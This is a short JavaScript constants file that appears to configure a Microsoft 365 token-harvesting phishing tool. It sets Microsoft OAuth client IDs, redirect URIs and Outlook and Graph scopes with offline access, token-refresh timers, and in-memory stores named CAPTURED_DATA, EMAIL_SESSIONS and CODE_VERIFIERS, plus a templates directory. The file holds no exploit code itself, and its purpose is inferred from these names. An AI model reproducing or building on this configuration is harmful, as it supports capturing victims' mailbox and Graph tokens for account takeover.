// config/constants.js
module.exports = {
    // Microsoft OAuth Config
    DUAL_TOKEN_CLIENT_ID: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
    DESKTOP_CLIENT_ID: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
    DUAL_TOKEN_REDIRECT_URI: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
    DESKTOP_REDIRECT_URI: 'urn:ietf:wg:oauth:2.0:oob',
    
    // Scopes
    OUTLOOK_SCOPE: 'https://outlook.office.com/.default openid profile offline_access',
    GRAPH_SCOPE: 'https://graph.microsoft.com/.default offline_access',
    
    // Timeouts
    SESSION_TIMEOUT: 7200000, // 2 hours
    CLEANUP_INTERVAL: 600000, // 10 minutes
    SESSION_COOLDOWN: 5000, // 5 seconds
    TOKEN_REFRESH_INTERVAL: 30 * 60 * 1000, // 30 minutes
    
    // Data stores (will be populated from server.js)
    ACTIVE_SESSIONS: new Map(),
    CAPTURED_DATA: new Map(),
    CODE_VERIFIERS: new Map(),
    MICROSOFT_PARAMS: new Map(),
    REQUEST_TIMESTAMPS: new Map(),
    EMAIL_SESSIONS: new Map(),
    
    // Templates directory
    TEMPLATES_DIR: 'templates'
};